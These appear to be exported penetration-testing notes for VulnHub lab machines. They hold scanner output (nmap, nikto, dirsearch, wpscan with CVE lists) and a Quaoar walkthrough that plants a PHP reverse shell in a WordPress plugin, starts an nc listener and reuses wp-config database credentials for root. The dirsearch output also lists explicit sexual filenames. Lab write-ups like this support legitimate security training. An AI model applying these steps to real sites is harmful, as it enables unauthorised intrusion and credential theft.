/Fabolous%20ft%20Mike%20Shorey%20Baby.php                                                                                                                                                                                              <br />[19:18:05] 303 -  417B  - /Fabolous%20ft%20Mike%20Shorey%20Baby/                                                                                                                                                                                                 <br />[19:18:05] 303 -  425B  - /acharliebrownchristmasbyvinceguaraldi.php                                                                                                                                                                                             <br />[19:18:05] 303 -  407B  - /fullalbumstreamloreenamckennitt/                                                                                                                                                                                                      <br />[19:18:07] 303 -  429B  - /L%20O%20S%20T%20Unofficial%20Soundtrack.php                                                                                                                                                                                           <br />[19:18:07] 303 -  423B  - /L%20O%20S%20T%20Unofficial%20Soundtrack/                                                                                                                                                                                              <br />[19:18:07] 303 -  455B  - /L%20Aube%20des%20Morts%20french%20dvdripxvidaliensyb.                                                                                                                                                                                 php                                                                                         <br />[19:18:07] 303 -  449B  - /L%20Aube%20des%20Morts%20french%20dvdripxvidaliensyb/                                                                                                                                                                                 <br />[19:18:10] 303 -  417B  - /RequireUpperCaseHeredocTerminator.php                                                                                                                                                                                                 <br />[19:18:11] 303 -  419B  - /M%20People%20Ultimate%20Collection.php                                                                                                                                                                                                <br />[19:18:11] 303 -  413B  - /M%20People%20Ultimate%20Collection/                                                                                                                                                                                                   <br />[19:18:11] 303 -  437B  - /Mac%20OS%20X%20Panther%20for%20Unix%20Geeks.php                                                                                                                                                                                       <br />[19:18:11] 303 -  431B  - /Mac%20OS%20X%20Panther%20for%20Unix%20Geeks/                                                                                                                                                                                          <br />[19:18:12] 303 -  407B  - /La%20disciplina%20della%20terra/                                                                                                                                                                                                      <br />[19:18:12] 303 -  473B  - /La%20Guerra%20De%20Los%20Mundos%20TS%20XviD%20Scree%2                                                                                                                                                                                 0SPANISH.php                                                                                                                    <br />[19:18:12] 303 -  467B  - /La%20Guerra%20De%20Los%20Mundos%20TS%20XviD%20Scree%2                                                                                                                                                                                 0SPANISH/                                                                                                           <br />[19:18:13] 303 -  445B  - /La%20Femme%20Nikita%202x08%20Darkness%20Visible.php                                                                                                                                                                                   <br />[19:18:13] 303 -  439B  - /La%20Femme%20Nikita%202x08%20Darkness%20Visible/                                                                                                                                                                                      <br />[19:18:13] 303 -  399B  - /l2%20c2%20patch%20for%20l2x/                                                                                                                                                                                                          <br />[19:18:13] 303 -  421B  - /La%20Bouche%20Sweet%20Dreams%201996.php                                                                                                                                                                                               <br />[19:18:13] 303 -  415B  - /La%20Bouche%20Sweet%20Dreams%201996/                                                                                                                                                                                                  <br />[19:18:13] 303 -  445B  - /La%20Casa%20De%20Cera%20TS%20Scree%20XviD%20MP3.php                                                                                                                                                                                   <br />[19:18:13] 303 -  439B  - /La%20Casa%20De%20Cera%20TS%20Scree%20XviD%20MP3/                                                                                                                                                                                      <br />[19:18:13] 303 -  435B  - /La%20Blue%20Girl%20Live%20Action%20Trilogy.php                                                                                                                                                                                        <br />[19:18:13] 303 -  429B  - /La%20Blue%20Girl%20Live%20Action%20Trilogy/                                                                                                                                                                                           <br />[19:18:14] 303 -  495B  - /La%20Liste%20De%20Schindler%20FR%20DVD%20Rip%20Shared                                                                                                                                                                                 %20By%20Kakashi1702.php                                                                                                                                                     <br />[19:18:14] 303 -  489B  - /La%20Liste%20De%20Schindler%20FR%20DVD%20Rip%20Shared                                                                                                                                                                                 %20By%20Kakashi1702/                                                                                                                                            <br />[19:18:14] 303 -  435B  - /i%20robot%20dvd%20feature%20the%20making%20of/                                                                                                                                                                                        <br />[19:18:14] 303 -  441B  - /i%20robot%20dvd%20feature%20the%20making%20of.php                                                                                                                                                                                     <br />[19:18:15] 303 -  443B  - /I%21%20My%21%20Me%21%20Strawberry%20Eggs%21%20OST/                                                                                                                                                                                    <br />[19:18:15] 303 -  449B  - /I%21%20My%21%20Me%21%20Strawberry%20Eggs%21%20OST.php                                                                                                                                                                                 <br />[19:18:15] 303 -  435B  - /I%20Will%20Walk%20Like%20A%20Crazy%20Horse.php                                                                                                                                                                                        <br />[19:18:15] 303 -  429B  - /I%20Will%20Walk%20Like%20A%20Crazy%20Horse/                                                                                                                                                                                           <br />[19:18:15] 303 -  433B  - /I%20Saw%20Mommy%20Eating%20Santa%20Clause.php                                                                                                                                                                                         <br />[19:18:15] 303 -  427B  - /I%20Saw%20Mommy%20Eating%20Santa%20Clause/                                                                                                                                                                                            <br />[19:18:15] 303 -  445B  - /I%20Spit%20On%20Your%20Grave%20DVD%20Rip%20DIVX.php                                                                                                                                                                                   <br />[19:18:15] 303 -  439B  - /I%20Spit%20On%20Your%20Grave%20DVD%20Rip%20DIVX/                                                                                                                                                                                      <br />[19:18:15] 303 -  419B  - /i%20deep%20throat%20in%20a%20thong.php                                                                                                                                                                                                <br />[19:18:15] 303 -  413B  - /i%20deep%20throat%20in%20a%20thong/                                                                                                                                                                                                   <br />[19:18:15] 303 -  425B  - /i%20deep%20throat%20in%20a%20thong%21.php                                                                                                                                                                                             <br />[19:18:15] 303 -  419B  - /i%20deep%20throat%20in%20a%20thong%21/                                                                                                                                                                                                <br />[19:18:15] 303 -  461B  - /I%20fucked%20my%2025%20yr%20old%20sisters%20hot%20pus                                                                                                                                                                                 sy.php                                                                                                  <br />[19:18:15] 303 -  455B  - /I%20fucked%20my%2025%20yr%20old%20sisters%20hot%20pus                                                                                                                                                                                 sy/                                                                                         <br />[19:18:15] 303 -  411B  - /i%20click%20dvd%20to%20divx%20avi/                                                                                                                                                                                                    <br />[19:18:15] 303 -  431B  - /I%20And%20Thou%20Shall%20Trust%20The%20Seer/                                                                                                                                                                                          <br />[19:18:15] 303 -  437B  - /I%20And%20Thou%20Shall%20Trust%20The%20Seer.php                                                                                                                                                                                       <br />[19:18:15] 303 -  433B  - /i%20deep%20throat%202%20girl%20tit%20fuck.php                                                                                                                                                                                         <br />[19:18:15] 303 -  427B  - /i%20deep%20throat%202%20girl%20tit%20fuck/       <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-7'>nikto</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.250<br />+ Target Hostname:    192.168.11.250<br />+ Target Port:        61337<br />+ Start Time:         2019-10-18 19:09:48 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Splunkd<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ Root page / redirects to: http://192.168.11.250/en-US/<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: GET, POST, HEAD, OPTIONS <br />+ 7926 requests: 9 error(s) and 2 item(s) reported on remote host<br />+ End Time:           2019-10-18 19:11:39 (GMT-4) (111 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/VulnHub/Sputnik# <br /><br /></div><div class='page'><h1 class='title level-4'>flag</h1><br/># cat flag.txt<br />cat flag.txt<br /> _________________________________________<br />/ Congratulations!                        \<br />|                                         |<br />| You did it!                             |<br />|                                         |<br />| Thank you for trying out this challenge |<br />| and hope that you learn a thing or two. |<br />|                                         |<br />| Check the flag below.                   |<br />|                                         |<br />| flag_is{w1th_gr34t_p0w3r_c0m35_w1th_gr3 |<br />| 4t_r3sp0ns1b1l1ty}                      |<br />|                                         |<br />| Hope you enjoy solving this challenge.  |<br />| :D                                      |<br />|                                         |<br />\ - ameer (from hackstreetboys)           /<br /> -----------------------------------------<br />      \                    / \  //\<br />       \    |\___/|      /   \//  \\<br />            /0  0  \__  /    //  | \ \    <br />           /     /  \/_/    //   |  \  \  <br />           @_^_@&#39;/   \/_   //    |   \   \ <br />           //_^_/     \/_ //     |    \    \<br />        ( //) |        \///      |     \     \<br />      ( / /) _|_ /   )  //       |      \     _\<br />    ( // /) &#39;/,_ _ _/  ( ; -.    |    _ _\.-~        .-~~~^-.<br />  (( / / )) ,-{        _      `-.|.-~-.           .~         `.<br /> (( // / ))  &#39;/\      /                 ~-. _ .-~      .-~^-.  \<br /> (( /// ))      `.   {            }                   /      \  \<br />  (( / ))     .----~-.\        \-&#39;                 .~         \  `. \^-.<br />             ///.----..&gt;        \             _ -~             `.  ^-`  ^-_<br />               ///-._ _ _ _ _ _ _}^ - - - - ~                     ~-- ,.-~<br />                                                                  /.-~<br /># <br /></div><div class='page'><h1 class='title level-3'>HF2016</h1><br/><br /></div><div class='page'><h1 class='title level-4'>Quaoar</h1><br/>nmap showed that 22, 53, 80, 110, 139, 143, 445,  993, 995 were open<br />ssh, nothing fancy<br />53 dns methodology did not show evidence of zone transfers<br />80 showed wordpress (via TireFire)<br />    wpscan -e got us admin admin!<br />    <br />logging into wordpress as an admin alows you to edit plugins<br />find one that is running php and throw in your long php reverseshell shellcode<br />start nc listener<br />save the file and activate the plugin <br />you should now have a shell!!<br /><br />sudo -l         nothing<br />find              nothing<br />uname -a    something, but no gcc<br />/var/www/wordpress/wp-config.php showed my sql creds!!<br /><br />/** MySQL database username */<br />define(&#39;DB_USER&#39;, &#39;root&#39;);<br /><br />/** MySQL database password */<br />define(&#39;DB_PASSWORD&#39;, &#39;rootpassword!&#39;);<br /><br />su -l root -p<br />rootpassword!<br />cat flag</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>/var/www/wordpress/wp-config.php<br /><br />/** MySQL database username */<br />define(&#39;DB_USER&#39;, &#39;root&#39;);<br /><br />/** MySQL database password */<br />define(&#39;DB_PASSWORD&#39;, &#39;rootpassword!&#39;);<br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>root@kali:~/Desktop/Machines/VulnHub/HF2019# nmap -sC -sV -p- 192.168.11.252<br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-18 22:17 EDT<br />Nmap scan report for 192.168.11.252<br />Host is up (0.018s latency).<br />Not shown: 65526 closed ports<br />PORT    STATE SERVICE     VERSION<br />22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)<br />|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)<br />|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)<br />53/tcp  open  domain      ISC BIND 9.8.1-P1<br />| dns-nsid: <br />|_  bind.version: 9.8.1-P1<br />80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))<br />| http-robots.txt: 1 disallowed entry <br />|_Hackers<br />|_http-server-header: Apache/2.2.22 (Ubuntu)<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />110/tcp open  pop3        Dovecot pop3d<br />|_pop3-capabilities: RESP-CODES TOP UIDL CAPA STLS PIPELINING SASL<br />|_ssl-date: 2019-10-19T02:12:45+00:00; -5m19s from scanner time.<br />139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br />143/tcp open  imap        Dovecot imapd<br />|_imap-capabilities: STARTTLS post-login ENABLE ID more have listed LOGIN-REFERRALS Pre-login capabilities LOGINDISABLEDA0001 LITERAL+ OK SASL-IR IMAP4rev1 IDLE<br />|_ssl-date: 2019-10-19T02:12:46+00:00; -5m19s from scanner time.<br />445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)<br />993/tcp open  ssl/imaps?<br />|_ssl-date: 2019-10-19T02:12:45+00:00; -5m19s from scanner time.<br />995/tcp open  ssl/pop3s?<br />|_ssl-date: 2019-10-19T02:12:45+00:00; -5m19s from scanner time.<br />MAC Address: 00:0C:29:12:EE:2F (VMware)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Host script results:<br />|_clock-skew: mean: 34m40s, deviation: 1h37m58s, median: -5m19s<br />|_nbstat: NetBIOS name: QUAOAR, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br />| smb-os-discovery: <br />|   OS: Unix (Samba 3.6.3)<br />|   Computer name: Quaoar<br />|   NetBIOS computer name: <br />|   Domain name: local<br />|   FQDN: Quaoar.local<br />|_  System time: 2019-10-18T22:12:45-04:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />|_smb2-time: Protocol negotiation failed (SMB2)<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 153.88 seconds<br /></div><div class='page'><h1 class='title level-6'>53</h1><br/>root@kali:~/Desktop/Machines/VulnHub/HF2019# nslookup<br />&gt; SERVER 192.168.11.252<br />Default server: 192.168.11.252<br />Address: 192.168.11.252#53<br />&gt; 127.0.0.1<br />1.0.0.127.in-addr.arpa	name = localhost.<br />&gt; exit<br />root@kali:~/Desktop/Machines/VulnHub/HF2019# dnsrecon -r 127.0.0.0/24 -n 192.168.11.252<br />[*] Reverse Look-up of a Range<br />[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255<br />[*] 	 PTR localhost 127.0.0.1<br />[+] 1 Records Found<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.252<br />+ Target Hostname:    192.168.11.252<br />+ Target Port:        80<br />+ Start Time:         2019-10-18 22:28:04 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.2.22 (Ubuntu)<br />+ Server may leak inodes via ETags, header found with file /, inode: 133975, size: 100, mtime: Mon Oct 24 00:00:10 2016<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3<br />+ Entry &#39;/wordpress/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ &quot;robots.txt&quot; contains 2 entries which should be manually viewed.<br />+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Uncommon header &#39;tcn&#39; found, with contents: list<br />+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.html<br />+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS <br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 8727 requests: 0 error(s) and 12 item(s) reported on remote host<br />+ End Time:           2019-10-18 22:28:23 (GMT-4) (19 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/VulnHub/HF2019# <br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-18_22-28-05.log<br /><br />Target: http://192.168.11.252:80<br /><br />[22:28:05] Starting: <br />[22:28:05] 403 -  290B  - /cgi-bin/  <br />[22:28:05] 403 -  288B  - /icons/      <br />[22:28:06] 403 -  286B  - /doc/           <br />[22:28:06] 200 -    3KB - /upload/              <br />[22:28:07] 301 -    0B  - /wordpress/  -&gt;  http://192.168.11.252/wordpress/<br />[22:32:13] 403 -  296B  - /server-status/ </div><div class='page'><h1 class='title level-6'>wpscan</h1><br/>root@kali:~/Desktop/Machines/VulnHub/HF2019# wpscan --url http://192.168.11.252:80/wordpress/ --enumerate u,ap,tt,t --passwords /root/Desktop/Tools/Wordlists/rockyou.txt -e<br />_______________________________________________________________<br />        __          _______   _____<br />        \ \        / /  __ \ / ____|<br />         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br />          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \<br />           \  /\  /  | |     ____) | (__| (_| | | | |<br />            \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br /><br />        WordPress Security Scanner by the WPScan Team<br />                       Version 3.6.0<br />          Sponsored by Sucuri - https://sucuri.net<br />      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_<br />_______________________________________________________________<br /><br />[i] It seems like you have not updated the database for some time.<br />[?] Do you want to update now? [Y]es [N]o, default: [N]<br />[+] URL: http://192.168.11.252/wordpress/<br />[+] Started: Fri Oct 18 22:39:23 2019<br /><br />Interesting Finding(s):<br /><br />[+] http://192.168.11.252/wordpress/<br /> | Interesting Entries:<br /> |  - Server: Apache/2.2.22 (Ubuntu)<br /> |  - X-Powered-By: PHP/5.3.10-1ubuntu3<br /> | Found By: Headers (Passive Detection)<br /> | Confidence: 100%<br /><br />[+] http://192.168.11.252/wordpress/xmlrpc.php<br /> | Found By: Direct Access (Aggressive Detection)<br /> | Confidence: 100%<br /> | References:<br /> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br /> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner<br /> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos<br /> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login<br /> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access<br /><br />[+] http://192.168.11.252/wordpress/readme.html<br /> | Found By: Direct Access (Aggressive Detection)<br /> | Confidence: 100%<br /><br />[+] Upload directory has listing enabled: http://192.168.11.252/wordpress/wp-content/uploads/<br /> | Found By: Direct Access (Aggressive Detection)<br /> | Confidence: 100%<br /><br />[+] http://192.168.11.252/wordpress/wp-cron.php<br /> | Found By: Direct Access (Aggressive Detection)<br /> | Confidence: 60%<br /> | References:<br /> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br /> |  - https://github.com/wpscanteam/wpscan/issues/1299<br /><br />[+] WordPress version 3.9.14 identified (Insecure, released on 2016-09-07).<br /> | Detected By: Rss Generator (Passive Detection)<br /> |  - http://192.168.11.252/wordpress/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=3.9.14&lt;/generator&gt;<br /> |  - http://192.168.11.252/wordpress/?feed=comments-rss2, &lt;generator&gt;http://wordpress.org/?v=3.9.14&lt;/generator&gt;<br /> |<br /> | [!] 39 vulnerabilities identified:<br /> |<br /> | [!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php<br /> |     Fixed in: 3.9.15<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8716<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488<br /> |      - https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php<br /> |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/<br /> |<br /> | [!] Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback<br /> |     Fixed in: 3.9.15<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8718<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5490<br /> |      - https://www.mehmetince.net/low-severity-wordpress/<br /> |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/<br /> |      - https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359<br /> |<br /> | [!] Title: WordPress &lt;= 4.7 - Post via Email Checks mail.example.com by Default<br /> |     Fixed in: 3.9.15<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8719<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5491<br /> |      - https://github.com/WordPress/WordPress/commit/061e8788814ac87706d8b95688df276fe3c8596a<br /> |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/<br /> |<br /> | [!] Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)<br /> |     Fixed in: 3.9.15<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8720<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5492<br /> |      - https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733<br /> |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/<br /> |<br /> | [!] Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG)<br /> |     Fixed in: 3.9.15<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8721<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5493<br /> |      - https://github.com/WordPress/WordPress/commit/cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4<br /> |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/<br /> |<br /> | [!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection<br /> |     Fixed in: 3.9.16<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8730<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611<br /> |      - https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/<br /> |      - https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb<br /> |<br /> | [!] Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata<br /> |     Fixed in: 3.9.17<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8765<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6814<br /> |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/<br /> |      - https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7<br /> |      - https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html<br /> |      - http://seclists.org/oss-sec/2017/q1/563<br /> |<br /> | [!] Title: WordPress 2.8.1-4.7.2 - Control Characters in Redirect URL Validation<br /> |     Fixed in: 3.9.17<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8766<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6815<br /> |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/<br /> |      - https://github.com/WordPress/WordPress/commit/288cd469396cfe7055972b457eb589cea51ce40e<br /> |<br /> | [!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8807<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295<br /> |      - https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html<br /> |      - http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html<br /> |      - https://core.trac.wordpress.org/ticket/25239<br /> |<br /> | [!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation<br /> |     Fixed in: 3.9.19<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8815<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066<br /> |      - https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11<br /> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/<br /> |<br /> | [!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC<br /> |     Fixed in: 3.9.19<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8816<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062<br /> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/<br /> |      - https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381<br /> |<br /> | [!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks <br /> |     Fixed in: 3.9.19<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8817<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065<br /> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/<br /> |      - https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4<br /> |<br /> | [!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF<br /> |     Fixed in: 3.9.19<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8818<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064<br /> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/<br /> |      - https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67<br /> |      - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html<br /> |<br /> | [!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS<br /> |     Fixed in: 3.9.19<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8819<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061<br /> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/<br /> |      - https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6<br /> |      - https://hackerone.com/reports/203515<br /> |      - https://hackerone.com/reports/203515<br /> |<br /> | [!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS &amp; CSRF<br /> |     Fixed in: 3.9.19<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8820<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063<br /> |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/<br /> |      - https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3<br /> |<br /> | [!] Title: WordPress 2.3.0-4.8.1 - $wpdb-&gt;prepare() potential SQL Injection<br /> |     Fixed in: 3.9.20<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8905<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14723<br /> |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/<br /> |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48<br /> |      - https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec<br /> |<br /> | [!] Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection<br /> |     Fixed in: 4.7.5<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8906<br /> |      - https://medium.com/websec/wordpress-sqli-bbb2afcc8e94<br /> |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/<br /> |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48<br /> |      - https://wpvulndb.com/vulnerabilities/8905<br /> |<br /> | [!] Title: WordPress 2.9.2-4.8.1 - Open Redirect<br /> |     Fixed in: 3.9.20<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8910<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725<br /> |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/<br /> |      - https://core.trac.wordpress.org/changeset/41398<br /> |<br /> | [!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping<br /> |     Fixed in: 3.9.20<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8911<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719<br /> |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/<br /> |      - https://core.trac.wordpress.org/changeset/41457<br /> |<br /> | [!] Title: WordPress &lt;= 4.8.2 - $wpdb-&gt;prepare() Weakness<br /> |     Fixed in: 3.9.21<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8941<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510<br /> |      - https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/<br /> |      - https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d<br /> |      - https://twitter.com/ircmaxell/status/923662170092638208<br /> |      - https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html<br /> |<br /> | [!] Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload<br /> |     Fixed in: 3.9.22<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8966<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092<br /> |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/<br /> |      - https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509<br /> |<br /> | [!] Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping<br /> |     Fixed in: 3.9.22<br /> |     References:<br /> |      - https://wpvulndb.com/vulnerabilities/8967<br /> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094<br /> |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/<br /> |      - https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de<br /> 